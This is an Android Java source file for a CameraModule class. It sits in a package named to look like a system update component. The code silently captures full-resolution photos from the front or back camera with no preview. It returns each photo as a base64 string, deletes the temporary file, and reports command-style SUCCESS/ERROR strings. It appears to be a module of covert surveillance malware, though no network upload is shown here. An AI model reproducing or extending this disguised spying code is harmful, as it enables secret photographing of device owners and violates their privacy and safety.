package com.android.system.update.modules;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.camera2.*;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.Size;
import androidx.core.app.ActivityCompat;
import android.graphics.ImageFormat;
import android.os.Looper;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;
import java.util.Arrays;

public class CameraModule {
    private static final String TAG = "CameraModule";
    private Context context;
    private CameraManager cameraManager;
    private String currentCameraId;
    private String backCameraId;
    private String frontCameraId;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;
    private Handler mainHandler;
    private boolean isUsingFrontCamera = false;
    
    public CameraModule(Context context) {
        Log.d(TAG, "📸 CameraModule constructor called");
        this.context = context;
        this.cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
        this.mainHandler = new Handler(Looper.getMainLooper());
        startBackgroundThread();
        
        Log.d(TAG, "📸 CameraManager obtained: " + (cameraManager != null));
        
        // Find both front and back cameras
        findCameras();
    }
    
    private void findCameras() {
        try {
            String[] cameraIdList = cameraManager.getCameraIdList();
            Log.d(TAG, "📸 Available cameras: " + Arrays.toString(cameraIdList));
            
            for (String id : cameraIdList) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                Log.d(TAG, "📸 Camera " + id + " facing: " + facing);
                
                if (facing != null) {
                    if (facing == CameraCharacteristics.LENS_FACING_BACK) {
                        backCameraId = id;
                        Log.d(TAG, "📸 Found back camera: " + id);
                    } else if (facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        frontCameraId = id;
                        Log.d(TAG, "📸 Found front camera: " + id);
                    }
                }
            }
            
            // Set default camera (prefer back, then front, then first available)
            if (backCameraId != null) {
                currentCameraId = backCameraId;
                isUsingFrontCamera = false;
                Log.d(TAG, "📸 Using back camera: " + currentCameraId);
            } else if (frontCameraId != null) {
                currentCameraId = frontCameraId;
                isUsingFrontCamera = true;
                Log.d(TAG, "📸 Using front camera: " + currentCameraId);
            } else if (cameraIdList.length > 0) {
                currentCameraId = cameraIdList[0];
                Log.d(TAG, "📸 Using first available camera: " + currentCameraId);
            } else {
                Log.e(TAG, "❌ No cameras found");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error finding cameras", e);
        }
    }
    
    public String switchCamera() {
        Log.d(TAG, "🔄 switchCamera() called");
        
        if (frontCameraId == null && backCameraId == null) {
            Log.e(TAG, "❌ No front or back camera available");
            return "ERROR: No front or back camera available";
        }
        
        // Toggle between front and back
        if (isUsingFrontCamera) {
            if (backCameraId != null) {
                currentCameraId = backCameraId;
                isUsingFrontCamera = false;
                Log.d(TAG, "🔄 Switched to back camera: " + currentCameraId);
                return "SUCCESS: Switched to back camera";
            } else {
                Log.e(TAG, "❌ No back camera available");
                return "ERROR: No back camera available";
            }
        } else {
            if (frontCameraId != null) {
                currentCameraId = frontCameraId;
                isUsingFrontCamera = true;
                Log.d(TAG, "🔄 Switched to front camera: " + currentCameraId);
                return "SUCCESS: Switched to front camera";
            } else {
                Log.e(TAG, "❌ No front camera available");
                return "ERROR: No front camera available";
            }
        }
    }
    
    public String getCurrentCamera() {
        return isUsingFrontCamera ? "front" : "back";
    }
    
    public String takePhoto() {
        Log.d(TAG, "📸 takePhoto() called with camera: " + currentCameraId);
        
        if (!checkPermission()) {
            Log.e(TAG, "❌ No camera permission");
            return "ERROR: No camera permission";
        }
        
        if (currentCameraId == null) {
            Log.e(TAG, "❌ No camera ID available");
            return "ERROR: No camera available";
        }
        
        final AtomicReference<String> result = new AtomicReference<>("ERROR: Failed to capture");
        final CountDownLatch latch = new CountDownLatch(1);
        
        try {
            final File photoFile = File.createTempFile("photo", ".jpg", 
                context.getExternalFilesDir(null));
            Log.d(TAG, "📁 Temp file created: " + photoFile.getAbsolutePath());
            
            // Get the largest size
            Size largest = getLargestSize();
            Log.d(TAG, "📐 Using size: " + largest.getWidth() + "x" + largest.getHeight());
            
            // Create ImageReader
            ImageReader imageReader = ImageReader.newInstance(largest.getWidth(), 
                largest.getHeight(), ImageFormat.JPEG, 2);
            
            // Set up the ImageAvailableListener
            imageReader.setOnImageAvailableListener(reader -> {
                Log.d(TAG, "📸 Image available");
                try (Image image = reader.acquireLatestImage()) {
                    if (image == null) {
                        Log.e(TAG, "❌ Image is null");
                        result.set("ERROR: Image is null");
                        latch.countDown();
                        return;
                    }
                    
                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    
                    Log.d(TAG, "📸 Image bytes: " + bytes.length);
                    
                    FileOutputStream fos = new FileOutputStream(photoFile);
                    fos.write(bytes);
                    fos.close();
                    
                    Log.d(TAG, "✅ Photo saved to: " + photoFile.getAbsolutePath());
                    result.set("SUCCESS");
                    
                } catch (Exception e) {
                    Log.e(TAG, "❌ Error in ImageAvailableListener", e);
                    result.set("ERROR: " + e.getMessage());
                } finally {
                    latch.countDown();
                }
            }, backgroundHandler);
            
            // Open camera
            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    Log.d(TAG, "✅ Camera opened");
                    try {
                        // Create capture session
                        device.createCaptureSession(
                            Arrays.asList(imageReader.getSurface()),
                            new CameraCaptureSession.StateCallback() {
                                @Override
                                public void onConfigured(CameraCaptureSession session) {
                                    Log.d(TAG, "✅ Session configured");
                                    try {
                                        CaptureRequest.Builder builder = 
                                            device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        builder.addTarget(imageReader.getSurface());
                                        builder.set(CaptureRequest.JPEG_QUALITY, (byte) 95);
                                        
                                        session.capture(builder.build(), 
                                            new CameraCaptureSession.CaptureCallback() {
                                                @Override
                                                public void onCaptureCompleted(CameraCaptureSession session, 
                                                        CaptureRequest request, TotalCaptureResult result) {
                                                    Log.d(TAG, "✅ Capture completed");
                                                }
                                            }, backgroundHandler);
                                            
                                    } catch (Exception e) {
                                        Log.e(TAG, "❌ Error creating capture request", e);
                                        result.set("ERROR: " + e.getMessage());
                                        latch.countDown();
                                    }
                                }
                                
                                @Override
                                public void onConfigureFailed(CameraCaptureSession session) {
                                    Log.e(TAG, "❌ Session configure failed");
                                    result.set("ERROR: Session configure failed");
                                    latch.countDown();
                                }
                            }, backgroundHandler
                        );
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error creating session", e);
                        result.set("ERROR: " + e.getMessage());
                        latch.countDown();
                    }
                }
                
                @Override
                public void onDisconnected(CameraDevice device) {
                    Log.w(TAG, "⚠️ Camera disconnected");
                    device.close();
                    result.set("ERROR: Camera disconnected");
                    latch.countDown();
                }
                
                @Override
                public void onError(CameraDevice device, int error) {
                    Log.e(TAG, "❌ Camera error: " + error);
                    device.close();
                    result.set("ERROR: Camera error: " + error);
                    latch.countDown();
                }
            }, backgroundHandler);
            
            // Wait for photo to be taken (max 5 seconds)
            latch.await(5000, TimeUnit.MILLISECONDS);
            
            if (photoFile.exists() && photoFile.length() > 0) {
                byte[] bytes = readFileToBytes(photoFile);
                String base64 = Base64.encodeToString(bytes, Base64.DEFAULT);
                photoFile.delete();
                Log.d(TAG, "✅ Photo captured and encoded, size: " + base64.length());
                return base64; // Return just base64, no prefix
            } else {
                return "ERROR: Failed to capture photo - file not created or empty";
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error in takePhoto", e);
            return "ERROR: " + e.getMessage();
        }
    }

    public String testCapture() {
        Log.d(TAG, "📸 testCapture() called");
        if (!checkPermission()) {
            return "ERROR: No camera permission";
        }
        
        try {
            // Try to open camera briefly
            CountDownLatch latch = new CountDownLatch(1);
            AtomicReference<String> result = new AtomicReference<>("Failed");
            
            cameraManager.openCamera(currentCameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice device) {
                    Log.d(TAG, "✅ Test camera opened successfully");
                    device.close();
                    result.set("SUCCESS");
                    latch.countDown();
                }
                
                @Override
                public void onDisconnected(CameraDevice device) {
                    Log.e(TAG, "❌ Test camera disconnected");
                    result.set("ERROR: Disconnected");
                    latch.countDown();
                }
                
                @Override
                public void onError(CameraDevice device, int error) {
                    Log.e(TAG, "❌ Test camera error: " + error);
                    result.set("ERROR: " + error);
                    latch.countDown();
                }
            }, backgroundHandler);
            
            if (latch.await(5000, TimeUnit.MILLISECONDS)) {
                return result.get();
            } else {
                return "ERROR: Timeout opening camera";
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ testCapture failed", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String testCamera() {
        Log.d(TAG, "🔧 Testing camera module");
        if (!checkPermission()) {
            return "ERROR: No camera permission";
        }
        
        try {
            String[] cameraIds = cameraManager.getCameraIdList();
            Log.d(TAG, "Available cameras: " + Arrays.toString(cameraIds));
            
            if (currentCameraId == null) {
                return "ERROR: No camera selected";
            }
            
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
            String facingStr = facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK" : 
                              (facing == CameraCharacteristics.LENS_FACING_FRONT ? "FRONT" : "OTHER");
            
            return "SUCCESS: Camera " + currentCameraId + " (" + facingStr + ") is available";
        } catch (Exception e) {
            Log.e(TAG, "❌ Camera test failed", e);
            return "ERROR: " + e.getMessage();
        }
    }

    public String checkCameraStatus() {
        Log.d(TAG, "🔍 Checking camera status");
        try {
            String[] cameraIds = cameraManager.getCameraIdList();
            StringBuilder status = new StringBuilder();
            status.append("Cameras: ").append(Arrays.toString(cameraIds)).append("\n");
            
            for (String id : cameraIds) {
                CameraCharacteristics chars = cameraManager.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                String facingStr = facing == CameraCharacteristics.LENS_FACING_BACK ? "BACK" : 
                                  (facing == CameraCharacteristics.LENS_FACING_FRONT ? "FRONT" : "OTHER");
                
                status.append("Camera ").append(id).append(" (").append(facingStr).append(")");
                
                if (id.equals(currentCameraId)) {
                    status.append(" [CURRENT]");
                }
                status.append("\n");
            }
            
            return "SUCCESS: " + status.toString();
        } catch (Exception e) {
            Log.e(TAG, "❌ Camera status check failed", e);
            return "ERROR: " + e.getMessage();
        }
    }

    public String simpleTest() {
        Log.d(TAG, "🔧 Simple camera test");
        if (!checkPermission()) {
            return "ERROR: No camera permission";
        }
        
        try {
            if (currentCameraId == null) {
                return "ERROR: No camera selected";
            }
            
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            Integer level = chars.get(CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL);
            String levelStr;
            switch (level) {
                case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_FULL:
                    levelStr = "FULL";
                    break;
                case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_LIMITED:
                    levelStr = "LIMITED";
                    break;
                case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_LEGACY:
                    levelStr = "LEGACY";
                    break;
                case CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL_3:
                    levelStr = "LEVEL_3";
                    break;
                default:
                    levelStr = "UNKNOWN";
            }
            return "SUCCESS: Camera hardware level: " + levelStr;
        } catch (Exception e) {
            Log.e(TAG, "❌ Simple test failed", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    public String simpleCapture() {
        Log.d(TAG, "📸 simpleCapture() called");
        if (!checkPermission()) {
            return "ERROR: No camera permission";
        }
        
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            Log.d(TAG, "📸 Camera characteristics: " + chars.get(CameraCharacteristics.INFO_SUPPORTED_HARDWARE_LEVEL));
            return "SUCCESS: Camera accessible";
        } catch (Exception e) {
            Log.e(TAG, "❌ simpleCapture failed", e);
            return "ERROR: " + e.getMessage();
        }
    }
    
    private byte[] readFileToBytes(File file) throws Exception {
        try (FileInputStream fis = new FileInputStream(file)) {
            byte[] bytes = new byte[(int) file.length()];
            fis.read(bytes);
            return bytes;
        }
    }
    
    public void startRecording(String args) {
        if (!checkPermission()) return;
        // Recording implementation would go here
        Log.d(TAG, "Recording started (stub)");
    }
    
    public String stopRecording() {
        Log.d(TAG, "Recording stopped (stub)");
        return "Recording stopped";
    }
    
    private Size getLargestSize() {
        try {
            CameraCharacteristics chars = cameraManager.getCameraCharacteristics(currentCameraId);
            StreamConfigurationMap configs = chars.get(
                CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (configs == null) {
                return new Size(1920, 1080);
            }
            
            Size[] sizes = configs.getOutputSizes(ImageFormat.JPEG);
            if (sizes == null || sizes.length == 0) {
                return new Size(1920, 1080);
            }
            
            Size largest = sizes[0];
            for (Size size : sizes) {
                if (size.getWidth() > largest.getWidth()) {
                    largest = size;
                }
            }
            return largest;
        } catch (Exception e) {
            Log.e(TAG, "Error getting largest size", e);
            return new Size(1920, 1080);
        }
    }
    
    private boolean checkPermission() {
        return ActivityCompat.checkSelfPermission(context, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED;
    }
    
    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }
}
